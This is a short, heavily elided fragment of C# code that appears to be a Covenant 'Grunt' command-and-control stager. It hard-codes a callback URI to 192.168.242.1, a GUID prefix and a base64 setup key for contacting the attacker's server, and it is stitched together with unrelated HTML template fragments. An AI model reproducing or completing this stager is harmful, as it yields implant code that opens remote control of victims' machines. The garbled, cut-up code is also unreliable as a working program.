...
namespace GruntStager
{
    public class BruteStager
    {
        ...
        public void ExecuteStager()
        {
            try
            {
                List<string> CovenantURIs = @"http://192.168.242.1:80".Split(',').ToList();
    ...
    <body>
        ...
        // Hello World! {0}
                ...
                string aGUID = @"db02fd7fc0";
                string GUID = Guid.NewGuid().ToString().Replace("-", "").Substring(0, 10);
                byte[] SetupKeyBytes = Convert.FromBase64String(@"5aopfhjPdME2F9WKa2gyPMXuk8JZvkIYEsPpDa3uwGc=");
